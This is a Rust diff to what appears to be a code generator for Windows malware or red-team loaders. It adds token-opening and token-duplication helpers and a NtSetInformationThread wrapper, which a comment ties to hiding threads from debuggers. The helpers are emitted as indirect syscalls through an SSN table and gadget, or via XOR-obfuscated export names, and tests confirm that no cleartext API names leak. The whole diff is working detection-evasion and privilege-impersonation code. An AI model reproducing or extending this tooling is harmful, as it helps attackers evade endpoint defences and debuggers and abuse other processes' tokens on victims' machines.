@@ -1091,6 +1091,138 @@ const OPEN_PROCESS_INDIRECT: &str = r#"    /// NtOpenProcess(&Handle, DesiredAcc
     }
 "#;
 
+/// `nt_open_process_token`, mode none: the ntdll export resolved dynamically
+/// (windows-rs does not declare it).
+const OPEN_PROCESS_TOKEN_NONE: &str = r#"    /// Signature of the ntdll export resolved dynamically in none mode.
+    type OpenProcessTokenFn = unsafe extern "system" fn(
+        HANDLE,
+        u32,
+        *const core::ffi::c_void,
+        *mut core::ffi::c_void,
+    ) -> i32;
+
+    /// NtOpenProcessToken(ProcessHandle, DesiredAccess, &ObjectAttributes,
+    /// &TokenHandle). None mode: resolve the export dynamically (windows-rs does
+    /// not declare it) and call it.
+    pub fn nt_open_process_token(
+        process: HANDLE,
+        access: u32,
+        attributes: *const core::ffi::c_void,
+        token: *mut core::ffi::c_void,
+    ) -> i32 {
+        let address = resolve_nt_export(&$OPEN_PROCESS_TOKEN_FUNC_DEF$);
+        if address == 0 {
+            return STATUS_UNSUCCESSFUL;
+        }
+        let open: OpenProcessTokenFn = unsafe { std::mem::transmute(address) };
+        unsafe { open(process, access, attributes, token) }
+    }
+"#;
+
+/// `nt_open_process_token`, mode indirect.
+const OPEN_PROCESS_TOKEN_INDIRECT: &str = r#"    /// NtOpenProcessToken(ProcessHandle, DesiredAccess, &ObjectAttributes,
+    /// &TokenHandle).
+    pub fn nt_open_process_token(
+        process: HANDLE,
+        access: u32,
+        attributes: *const core::ffi::c_void,
+        token: *mut core::ffi::c_void,
+    ) -> i32 {
+        let Some(ssns) = SSNS.get() else {
+            return STATUS_UNSUCCESSFUL;
+        };
+        let Some(gadget) = GADGET.get() else {
+            return STATUS_UNSUCCESSFUL;
+        };
+        unsafe {
+            nt_invoke(
+                process.0 as usize,
+                access as usize,
+                attributes as usize,
+                token as usize,
+                0,
+                0,
+                0,
+                0,
+                0,
+                0,
+                0,
+                ssns.open_process_token,
+                *gadget,
+            )
+        }
+    }
+"#;
+
+/// `nt_duplicate_token`, mode none: the ntdll export resolved dynamically
+/// (windows-rs does not declare it).
+const DUPLICATE_TOKEN_NONE: &str = r#"    /// Signature of the ntdll export resolved dynamically in none mode.
+    type DuplicateTokenFn = unsafe extern "system" fn(
+        HANDLE,
+        u32,
+        *const core::ffi::c_void,
+        i32,
+        i32,
+        *mut core::ffi::c_void,
+    ) -> i32;
+
+    /// NtDuplicateToken(ExistingTokenHandle, DesiredAccess, &ObjectAttributes,
+    /// ImpersonationLevel, TokenType, &NewTokenHandle). None mode: resolve the
+    /// export dynamically (windows-rs does not declare it) and call it.
+    pub fn nt_duplicate_token(
+        existing: HANDLE,
+        access: u32,
+        attributes: *const core::ffi::c_void,
+        level: i32,
+        token_type: i32,
+        new_token: *mut core::ffi::c_void,
+    ) -> i32 {
+        let address = resolve_nt_export(&$DUPLICATE_TOKEN_FUNC_DEF$);
+        if address == 0 {
+            return STATUS_UNSUCCESSFUL;
+        }
+        let duplicate: DuplicateTokenFn = unsafe { std::mem::transmute(address) };
+        unsafe { duplicate(existing, access, attributes, level, token_type, new_token) }
+    }
+"#;
+
+/// `nt_duplicate_token`, mode indirect.
+const DUPLICATE_TOKEN_INDIRECT: &str = r#"    /// NtDuplicateToken(ExistingTokenHandle, DesiredAccess, &ObjectAttributes,
+    /// ImpersonationLevel, TokenType, &NewTokenHandle).
+    pub fn nt_duplicate_token(
+        existing: HANDLE,
+        access: u32,
+        attributes: *const core::ffi::c_void,
+        level: i32,
+        token_type: i32,
+        new_token: *mut core::ffi::c_void,
+    ) -> i32 {
+        let Some(ssns) = SSNS.get() else {
+            return STATUS_UNSUCCESSFUL;
+        };
+        let Some(gadget) = GADGET.get() else {
+            return STATUS_UNSUCCESSFUL;
+        };
+        unsafe {
+            nt_invoke(
+                existing.0 as usize,
+                access as usize,
+                attributes as usize,
+                level as usize,
+                token_type as usize,
+                new_token as usize,
+                0,
+                0,
+                0,
+                0,
+                0,
+                ssns.duplicate_token,
+                *gadget,
+            )
+        }
+    }
+"#;
+
 /// `nt_queue_apc`, mode none: `QueueUserAPC` mapped to an NTSTATUS.
 ///
 /// The native call carries three APC arguments; the Win32 one carries a single
@@ -1186,6 +1318,74 @@ const SET_INFO_FILE_NONE: &str = r#"    /// Signature of the ntdll export resolv
         }
         let set_info: SetInfoFileFn = unsafe { std::mem::transmute(address) };
         unsafe { set_info(file, io_status, info, length, class) }
+    }
+"#;
+
+/// `nt_set_info_thread`, mode none: the ntdll export resolved dynamically.
+///
+/// The Win32 wrapper (`SetThreadInformation`) rejects `ThreadHideFromDebugger`
+/// with `ERROR_INVALID_PARAMETER` on Windows 11 26200 (measured: the same call
+/// against `NtSetInformationThread` returns `STATUS_SUCCESS`), so the native
+/// call is used verbatim in both modes.
+const SET_INFO_THREAD_NONE: &str = r#"    /// Signature of the ntdll export resolved dynamically in none mode.
+    type SetInfoThreadFn = unsafe extern "system" fn(
+        HANDLE,
+        i32,
+        *const core::ffi::c_void,
+        u32,
+    ) -> i32;
+
+    /// NtSetInformationThread(ThreadHandle, ThreadInformationClass,
+    /// ThreadInformation, ThreadInformationLength). None mode: resolve the
+    /// export dynamically (the Win32 wrapper does not support every class) and
+    /// call it.
+    pub fn nt_set_info_thread(
+        thread: HANDLE,
+        class: i32,
+        info: *const core::ffi::c_void,
+        length: u32,
+    ) -> i32 {
+        let address = resolve_nt_export(&$SET_INFO_THREAD_FUNC_DEF$);
+        if address == 0 {
+            return STATUS_UNSUCCESSFUL;
+        }
+        let set_info: SetInfoThreadFn = unsafe { std::mem::transmute(address) };
+        unsafe { set_info(thread, class, info, length) }
+    }
+"#;
+
+/// `nt_set_info_thread`, mode indirect.
+const SET_INFO_THREAD_INDIRECT: &str = r#"    /// NtSetInformationThread(ThreadHandle, ThreadInformationClass,
+    /// ThreadInformation, ThreadInformationLength).
+    pub fn nt_set_info_thread(
+        thread: HANDLE,
+        class: i32,
+        info: *const core::ffi::c_void,
+        length: u32,
+    ) -> i32 {
+        let Some(ssns) = SSNS.get() else {
+            return STATUS_UNSUCCESSFUL;
+        };
+        let Some(gadget) = GADGET.get() else {
+            return STATUS_UNSUCCESSFUL;
+        };
+        unsafe {
+            nt_invoke(
+                thread.0 as usize,
+                class as usize,
+                info as usize,
+                length as usize,
+                0,
+                0,
+                0,
+                0,
+                0,
+                0,
+                0,
+                ssns.set_info_thread,
+                *gadget,
+            )
+        }
     }
 "#;
 
@@ -1580,6 +1780,42 @@ const NT_FUNCTIONS: &[NtFunction] = &[
         }),
     },
     NtFunction {
+        name: "NtOpenProcessToken",
+        table_field: "open_process_token",
+        helper_name: "nt_open_process_token",
+        helper_none: OPEN_PROCESS_TOKEN_NONE,
+        helper_indirect: OPEN_PROCESS_TOKEN_INDIRECT,
+        proxy: Some(NtProxyInfo {
+            helper_name: "nt_open_process_token",
+            params: &[
+                ("process", P_HANDLE),
+                ("access", "u32"),
+                ("attributes", P_CVOID),
+                ("token", P_PVOID),
+            ],
+            forward: "process, access, attributes, token",
+        }),
+    },
+    NtFunction {
+        name: "NtDuplicateToken",
+        table_field: "duplicate_token",
+        helper_name: "nt_duplicate_token",
+        helper_none: DUPLICATE_TOKEN_NONE,
+        helper_indirect: DUPLICATE_TOKEN_INDIRECT,
+        proxy: Some(NtProxyInfo {
+            helper_name: "nt_duplicate_token",
+            params: &[
+                ("existing", P_HANDLE),
+                ("access", "u32"),
+                ("attributes", P_CVOID),
+                ("level", "i32"),
+                ("token_type", "i32"),
+                ("new_token", P_PVOID),
+            ],
+            forward: "existing, access, attributes, level, token_type, new_token",
+        }),
+    },
+    NtFunction {
         name: "NtQueueApcThread",
         table_field: "queue_apc",
         helper_name: "nt_queue_apc",
@@ -1613,6 +1849,23 @@ const NT_FUNCTIONS: &[NtFunction] = &[
                 ("class", "i32"),
             ],
             forward: "file, io_status, info, length, class",
+        }),
+    },
+    NtFunction {
+        name: "NtSetInformationThread",
+        table_field: "set_info_thread",
+        helper_name: "nt_set_info_thread",
+        helper_none: SET_INFO_THREAD_NONE,
+        helper_indirect: SET_INFO_THREAD_INDIRECT,
+        proxy: Some(NtProxyInfo {
+            helper_name: "nt_set_info_thread",
+            params: &[
+                ("thread", P_HANDLE),
+                ("class", "i32"),
+                ("info", P_CVOID),
+                ("length", "u32"),
+            ],
+            forward: "thread, class, info, length",
         }),
     },
 ];
@@ -1753,6 +2006,15 @@ fn render_none(required: &[&'static NtFunction], strings: &StringsConfig) -> Str
     let set_info_file_def = strings
         .obfuscate("NtSetInformationFile")
         .render_stub_expr("set_info_file_name");
+    let set_info_thread_def = strings
+        .obfuscate("NtSetInformationThread")
+        .render_stub_expr("set_info_thread_name");
+    let open_process_token_def = strings
+        .obfuscate("NtOpenProcessToken")
+        .render_stub_expr("open_process_token_name");
+    let duplicate_token_def = strings
+        .obfuscate("NtDuplicateToken")
+        .render_stub_expr("duplicate_token_name");
 
     let mut out = String::from(prelude::NONE_PRELUDE);
     for f in required {
@@ -1767,6 +2029,9 @@ fn render_none(required: &[&'static NtFunction], strings: &StringsConfig) -> Str
         .replace("$SET_CONTEXT_FUNC_DEF$", &set_context_def)
         .replace("$QUERY_THREAD_FUNC_DEF$", &query_thread_def)
         .replace("$SET_INFO_FILE_FUNC_DEF$", &set_info_file_def)
+        .replace("$SET_INFO_THREAD_FUNC_DEF$", &set_info_thread_def)
+        .replace("$OPEN_PROCESS_TOKEN_FUNC_DEF$", &open_process_token_def)
+        .replace("$DUPLICATE_TOKEN_FUNC_DEF$", &duplicate_token_def)
 }
 
 /// Renders the `mode: indirect` body: the prelude (with the SSN table fields,
@@ -2560,5 +2825,52 @@ mod tests {
                 || block.contains("nt_create_thread_ex_native}"),
             "native helper not re-exported: {block}"
         );
+    }
+
+    #[test]
+    fn token_helpers_offer_direct_proxies() {
+        let open = nt_proxy_info("NtOpenProcessToken").expect("direct");
+        assert_eq!(open.helper_name, "nt_open_process_token");
+        assert_eq!(open.params.len(), 4);
+        assert_eq!(open.forward, "process, access, attributes, token");
+
+        let duplicate = nt_proxy_info("NtDuplicateToken").expect("direct");
+        assert_eq!(duplicate.helper_name, "nt_duplicate_token");
+        assert_eq!(duplicate.params.len(), 6);
+        assert_eq!(
+            duplicate.forward,
+            "existing, access, attributes, level, token_type, new_token"
+        );
+    }
+
+    #[test]
+    fn token_helpers_render_in_indirect_mode() {
+        let block = render_block_with(
+            &indirect(),
+            &[],
+            &xor_config(),
+            &["NtOpenProcessToken", "NtDuplicateToken"],
+            TEST_SEED,
+        );
+        assert!(block.contains("pub fn nt_open_process_token"), "{block}");
+        assert!(block.contains("pub fn nt_duplicate_token"), "{block}");
+        assert!(block.contains("ssns.open_process_token"), "{block}");
+        assert!(block.contains("ssns.duplicate_token"), "{block}");
+        assert!(!block.contains('$'), "leftover placeholder: {block}");
+    }
+
+    #[test]
+    fn token_helpers_render_in_none_mode_without_leaking_names() {
+        let block = render_block_with(
+            &SyscallsConfig::default(),
+            &[],
+            &xor_config(),
+            &["NtOpenProcessToken", "NtDuplicateToken"],
+            TEST_SEED,
+        );
+        assert!(block.contains("resolve_nt_export(&"), "{block}");
+        assert!(!block.contains('$'), "leftover placeholder: {block}");
+        let leaked = crate::audit::strings::find_sensitive_literals_in_source(&block);
+        assert!(leaked.is_empty(), "cleartext names leaked: {leaked:?}");
     }
 }
